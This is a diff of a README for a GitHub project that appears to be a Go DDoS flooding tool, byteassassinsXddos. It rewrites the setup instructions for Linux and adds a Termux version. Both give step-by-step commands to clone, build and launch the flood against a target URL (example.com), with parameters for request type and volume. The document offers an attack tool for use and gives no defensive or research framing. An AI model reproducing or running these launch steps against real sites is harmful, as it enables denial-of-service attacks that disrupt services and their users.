@@ -22,32 +22,49 @@ A DDoS attack aims to overwhelm the devices, services, and network of its intend
 
 
 
-setup=>👾
+# setup for linux!=>👾
 
 
-step 1 >   git clone https://github.com/Sumitshah00/byteassassinsXddos.git
+`sudo apt update`
 
+`sudo apt upgrade`
 
+`git clone https://github.com/Sumitshah00/byteassassinsXddos.git`
 
-step 2 >   cd byteassassinsXddos
+`cd byteassassinsXddos`
 
+`sudo apt install golang`
 
+`go build byteassassinsXddos.go`
 
-step 3 >  pkg install golang
-
-
-
-
-step 4 >   go build byteassassinsXddos.go
-
-
-
-step 5 >  ./byteassassinsXddos https://example.com 5000 get 1200 nil
-
+`./byteassassinsXddos https://example.com 5000 get 1200 nil`
 
 
 ![image](https://github.com/Sumitshah00/byteassassinsXddos/assets/149252561/2bbf01b7-f1c9-4851-8637-8a894d2042a2)
 
+
+
+# and Here are the commands you can run in Termux to achieve the same tasks:~
+
+
+
+`pkg update`
+
+`pkg upgrade`
+
+`git clone https://github.com/Sumitshah00/byteassassinsXddos.git`
+
+`cd byteassassinsXddos`
+
+`pkg install golang`
+
+`go build byteassassinsXddos.go`
+
+`./byteassassinsXddos https://example.com 5000 get 1200 nil`
+
+
+
+![image](https://github.com/Sumitshah00/byteassassinsXddos/assets/149252561/2b7301fa-c0ba-458a-b433-80cfccaa67c4)
 
 
 ########################################
